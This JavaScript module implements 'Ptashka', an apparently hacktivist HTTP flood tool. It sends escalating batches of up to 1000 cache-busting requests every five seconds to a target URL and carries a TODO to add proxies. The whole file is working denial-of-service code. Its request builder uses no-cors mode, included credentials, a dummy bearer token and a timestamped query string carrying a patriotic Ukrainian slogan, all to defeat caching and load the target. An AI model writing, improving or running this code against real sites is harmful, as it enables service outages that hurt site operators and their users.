/*
-- FLOW --
-- a. Start sending requests starting from 1 to 1000 per 5 seconds
-- b. Start increasing the outgoing requests batch size until it reaches a breakpoint
-- c. Once the breakpoint is reached, start decreasing the outgoing requests batch size 
----- until it reaches a lower breakpoint
*/

// CONSTANTS
const STATUS_READY = 'READY';
const STATUS_RUNNING = 'RUNNING';
const STATUS_PAUSED = 'PAUSED';

const INTERVAL_PERIOD = 5000; // 5 sec

const BATCH_STEP = 0.25;
const BATCH_SIZE_LIMIT = 1000;
const BATCH_SIZE_DIRECTION_INCREASING = 1;
const BATCH_SIZE_DIRECTION_DECREASING = -1;

// TODO: Retrieve the Content-Length
// TODO: Find proxies

class Ptashka extends EventTarget {
  constructor(url) {
    super();

    this.url = url;
  }

  url = '';
  status = STATUS_READY;
  sent = 0;
  interval = null;
  startedAt = null;
  pausedAt = null;

  batchSizeDirection = BATCH_SIZE_DIRECTION_INCREASING;
  batchSizeBreakpoint = 64;
  batchSize = 1; // number of ptashka to send at the interval

  event = new CustomEvent('change', { detail: this });
  controller = new AbortController();

  static async send(url) {
    const instance = new Ptashka(url);

    return instance.send();
  }

  async send() {
    if (this.isStatusRunning) {
      throw new Error(`The Ptashka is already working on ${this.url}.`);
    }

    // TODO: immediately start
    this.interval = setInterval(async () => {
      let batch = [];

      let counter = 0;
      for (counter; counter < this.batchSize; counter += 1) {
        const request = this.#createRequest();

        batch.push(request);
      }

      const responses = await Promise.allSettled(
        batch.map(async (request) => {
          const response = await fetch(request);

          return response;
        })
      );

      this.#setSent(this.sent + this.batchSize);

      console.log('RESPONSES', responses);

      const isBreakpointReached = this.#isBatchSizeDirectionIncreasing
        ? this.batchSize >= this.batchSizeBreakpoint
        : this.batchSize <= this.batchSizeBreakpoint;

      // if the breakpoint is reached
      if (isBreakpointReached) {
        // set a default breakpoint
        let nextBreakpoint = BATCH_SIZE_LIMIT;

        // then check whether the batch size is increasing or decreasing
        switch (this.batchSizeDirection) {
          case BATCH_SIZE_DIRECTION_INCREASING: {
            // otherwise decrease the limit

            nextBreakpoint = this.batchSizeBreakpoint / 2;

            break;
          }

          case BATCH_SIZE_DIRECTION_DECREASING: {
            // then increase a limit
            nextBreakpoint = this.batchSizeBreakpoint * 4;

            // and check whether the next batch size breakpoint is not higher than a limit
            const isLimitReached = nextBreakpoint > BATCH_SIZE_LIMIT;

            // if the next batch size breakpoint is higher than a limit
            if (isLimitReached) {
              // then limit the next batch size
              nextBreakpoint = BATCH_SIZE_LIMIT;
            }

            break;
          }
        }

        this.#reverseDirection();

        this.batchSizeBreakpoint = nextBreakpoint;
      }

      // TODO: refactor as a separate function
      this.batchSize +=
        this.batchSizeDirection * (this.batchSizeBreakpoint * BATCH_STEP);
    }, INTERVAL_PERIOD);

    this.#setStatusRunning();

    return this;
  }

  async pause() {
    if (!this.isStatusRunning) {
      throw new Error(`The Ptashka is not working on ${this.url} yet.`);
    }

    // abort the fetch requests
    this.controller.abort();

    this.#resetInterval();

    this.#setStatusPaused();
  }

  async resume() {
    if (!this.isStatusPaused) {
      throw new Error(`The Ptashka working on ${this.url} is not paused yet.`);
    }

    this.send();
  }

  onchange(callback, options) {
    this.addEventListener('change', callback, options);
  }

  toJSON() {
    // TODO: IMPLEMENT
  }

  // GETTERS
  get isStatusRunning() {
    return this.status === STATUS_RUNNING;
  }

  get isStatusPaused() {
    return this.status === STATUS_PAUSED;
  }

  get #isBatchSizeDirectionIncreasing() {
    return this.batchSizeDirection === BATCH_SIZE_DIRECTION_INCREASING;
  }

  // SETTERS
  #setStatus(value) {
    const currentDateISO = new Date().toISOString();

    this.status = value;

    switch (value) {
      case STATUS_RUNNING: {
        this.#setStartedAt(currentDateISO);

        break;
      }

      case STATUS_PAUSED: {
        this.#setPausedAt(currentDateISO);

        break;
      }
    }

    this.dispatchEvent(this.event);
  }

  #setStatusRunning() {
    this.#setStatus(STATUS_RUNNING);
  }

  #setStatusPaused() {
    this.#setStatus(STATUS_PAUSED);
  }

  #setSent(value) {
    this.sent = value;

    this.dispatchEvent(this.event);
  }

  #setStartedAt(value) {
    this.startedAt = value;

    this.dispatchEvent(this.event);
  }

  #setPausedAt(value) {
    this.pausedAt = value;

    this.dispatchEvent(this.event);
  }

  #setInterval(value) {
    this.interval = value;
  }

  // HELPERS
  #reverseDirection() {
    this.batchSizeDirection =
      this.batchSizeDirection === BATCH_SIZE_DIRECTION_INCREASING
        ? BATCH_SIZE_DIRECTION_DECREASING
        : BATCH_SIZE_DIRECTION_INCREASING;
  }

  #createRequest() {
    const requestOptions = {
      mode: 'no-cors',
      credentials: 'include',
      cache: 'no-cache',
      headers: {
        Authorization:
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
      },
      signal: this.controller.signal,
    };

    const searchParamsKey = Date.now();
    const searchParamsValue = `%D0%A1%D0%9B%D0%90%D0%92%D0%90%20%D0%A3%D0%9A%D0%A0%D0%90%D0%87%D0%9D%D0%86!%20${Date.now()}`;

    // TODO: allow the URL to contain the search params and cut them off
    const requestUrl = `${this.url}?${searchParamsKey}=${searchParamsValue}`;

    const request = new Request(requestUrl, requestOptions);

    return request;
  }

  #resetInterval() {
    console.log('INTERVAL', this.interval);
    clearInterval(this.interval);

    this.#setInterval(null);
  }
}

export default Ptashka;
